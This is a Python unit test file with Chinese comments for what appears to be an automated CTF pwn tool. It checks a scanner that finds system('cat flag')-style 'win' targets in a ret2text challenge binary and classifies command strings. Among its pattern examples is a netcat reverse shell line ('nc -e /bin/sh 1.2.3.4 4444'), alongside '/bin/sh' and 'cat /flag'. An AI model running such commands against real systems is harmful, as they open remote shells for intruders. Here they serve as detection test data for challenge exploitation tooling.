"""单元测试 — win 目标代码扫描 (ret2text 泛化)"""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from intelpwn.core.analysis.win_targets import scan_win_targets, _is_command_string

BIN = "challenges/challenge_ret2text"


class TestWinTargets:
    def test_scans_ret2text_binary(self):
        """自编 ret2text 靶子: 应找到 system("cat flag") 的链起点 (模式断言, 不依赖地址)"""
        targets = scan_win_targets(BIN)
        assert targets, "应扫描出命令执行目标"
        t = targets[0]
        assert t["address"].startswith("0x"), f"目标应为链起点地址, 实际 {t['address']}"
        assert t["string"].startswith("cat"), f"字符串应为 cat 命令, 实际 {t['string']!r}"
        assert t["call"].startswith("system")

    def test_no_fp_on_benign_system(self):
        """system("clear") 之类良性调用不应命中"""
        assert not _is_command_string("clear")
        assert not _is_command_string("echo hi")
        assert not _is_command_string("date")

    def test_command_strings(self):
        """命令特征: /bin/sh 与 cat flag 类都算 (含无斜杠变体)"""
        assert _is_command_string("/bin/sh")
        assert _is_command_string("/bin/bash")
        assert _is_command_string("cat /flag")
        assert _is_command_string("cat flag")
        assert _is_command_string("sh -c 'id'")
        assert _is_command_string("nc -e /bin/sh 1.2.3.4 4444")
